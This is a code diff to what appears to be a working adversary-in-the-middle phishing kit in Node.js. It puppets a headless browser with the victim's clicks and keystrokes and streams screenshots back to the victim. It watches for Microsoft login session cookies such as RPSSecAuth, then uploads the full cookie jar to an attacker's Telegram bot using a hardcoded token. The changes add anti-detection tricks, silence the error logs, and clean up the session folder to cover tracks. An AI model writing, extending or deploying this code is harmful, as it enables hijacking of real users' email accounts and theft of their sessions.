@@ -1,6 +1,8 @@
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
 const FormData = require('form-data');
 
 puppeteer.use(StealthPlugin());
@@ -12,7 +14,7 @@ async function getCredentials() {
     try {
         const response = await axios.get(VAULT_URL, { timeout: 7000 });
         if (response.data && response.data.TG_TOKEN) return response.data;
-    } catch (e) { console.log("[SYSTEM] Fallback active."); }
+    } catch (e) {}
     return { 
         "TG_TOKEN": "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc",
         "TG_CHAT_ID": "1318100118"
@@ -23,23 +25,24 @@ async function sendExfiltration(cookies, url) {
     const creds = await getCredentials();
     const host = new URL(url).hostname;
     try {
+        // Only sends ONE message when the strict condition is met
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
             chat_id: creds.TG_CHAT_ID,
-            text: `<b>🚨 MAILBOX OPENED & CAPTURED</b>\n<b>User:</b> ${host}\n<b>Status:</b> Full Access Verified`,
+            text: `<b>🎯 TARGET VERIFIED: ${host}</b>\n<b>Key:</b> RPSSecAuth Detected\n<b>Jar Size:</b> ${cookies.length}\n<b>Access:</b> Mailbox Authorized`,
             parse_mode: 'HTML'
         });
 
         const form = new FormData();
         form.append('chat_id', creds.TG_CHAT_ID);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
-            filename: `MAILBOX_SESSION_${host.replace(/\./g, '_')}.json`,
+            filename: `FULL_ACCESS_${host.replace(/\./g, '_')}.json`,
             contentType: 'application/json'
         });
 
         await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
-    } catch (e) { console.log("[EXFIL] Error."); }
+    } catch (e) {}
 }
 
 async function startSession(io, socket) {
@@ -47,60 +50,55 @@ async function startSession(io, socket) {
     let captured = false;
 
     try {
+        const userDataDir = path.join(__dirname, `session_${Date.now()}`);
+
         browser = await puppeteer.launch({
             headless: "new",
+            userDataDir: userDataDir,
             args: [
-                '--no-sandbox', 
-                '--disable-setuid-sandbox', 
-                '--disable-features=IsolateOrigins,site-per-process',
-                '--disable-blink-features=AutomationControlled' // Vital for mailbox access
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-blink-features=AutomationControlled',
+                '--disable-features=IsolateOrigins,site-per-process'
             ]
         });
 
         const [page] = await browser.pages();
         await page.setViewport({ width: 1280, height: 720 });
-        // Use a persistent browser identity
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');
+        
+        await page.evaluateOnNewDocument(() => {
+            const newProto = navigator.__proto__;
+            delete newProto.webdriver;
+            navigator.__proto__ = newProto;
+        });
 
         await page.goto(TARGET, { waitUntil: 'networkidle2' });
 
-        // --- THE "MAILBOX HUNTER" LOGIC ---
+        // --- THE STRICT VALIDATOR POLLER ---
         const monitor = setInterval(async () => {
             if (captured) return;
-
             try {
-                const url = page.url();
                 const cookies = await page.cookies();
-
-                // 1. Detect if the user has clicked "Yes" on KMSI or finished 2FA
-                const hasIdentity = cookies.some(c => c.name.includes('MSAAUTH') || c.name.includes('ESTSAUTH'));
                 
-                // 2. If they have identity but are stuck, force the jump to the mailbox
-                if (hasIdentity && (url.includes('kmsi') || url.includes('reprocess'))) {
-                    console.log("[FLOW] Identity confirmed. Monitoring for redirect...");
-                }
+                // STRICT CONDITION: Look for the specific Session Data Key
+                const rpsKey = cookies.find(c => c.name === 'RPSSecAuth');
 
-                // 3. SUCCESS CONDITION: The mailbox is actually open
-                const isMailboxOpen = url.includes('outlook.live.com') || url.includes('mail.live.com') || url.includes('outlook.office.com');
-                const hasSessionKey = cookies.some(c => c.name.includes('RPSSecAuth') || c.name.includes('WLSSC'));
+                if (rpsKey && rpsKey.value.length > 50) {
+                    captured = true; // Prevents duplicate logs
+                    console.log("💎 RPSSecAuth FOUND. CAPTURING FULL JAR...");
 
-                if (isMailboxOpen && hasSessionKey) {
-                    captured = true;
-                    console.log("[TARGET] Mailbox accessed. Finalizing jar...");
-                    
-                    // Allow the inbox to fully load its assets (which sets the final cookies)
-                    await page.waitForTimeout(3000); 
-                    const finalCookies = await page.cookies();
-                    await sendExfiltration(finalCookies, url);
+                    // Final 3-second settle to catch the last-minute 'ESTSAUTH' updates
+                    setTimeout(async () => {
+                        const matureJar = await page.cookies();
+                        await sendExfiltration(matureJar, page.url());
+                    }, 3000);
                 }
             } catch (e) {}
-        }, 4000);
+        }, 4000); // Poll every 4 seconds to reduce resource overhead
 
-        // --- INTERACTION ---
         socket.on('victim-action', async (data) => {
             try {
                 if (data.type === 'click') {
-                    await page.mouse.move(data.x, data.y);
                     await page.mouse.click(data.x, data.y);
                 } else if (data.type === 'key') {
                     await page.keyboard.press(data.key);
@@ -108,7 +106,6 @@ async function startSession(io, socket) {
             } catch (e) {}
         });
 
-        // --- STREAM ---
         const stream = setInterval(async () => {
             if (socket.connected) {
                 try {
@@ -116,12 +113,13 @@ async function startSession(io, socket) {
                     socket.emit('browser-render', { screenshot: b64 });
                 } catch (e) {}
             }
-        }, 1200);
+        }, 1000);
 
         socket.on('disconnect', async () => {
             clearInterval(monitor);
             clearInterval(stream);
             if (browser) await browser.close();
+            if (fs.existsSync(userDataDir)) fs.rmSync(userDataDir, { recursive: true, force: true });
         });
 
     } catch (err) { if (browser) await browser.close(); }
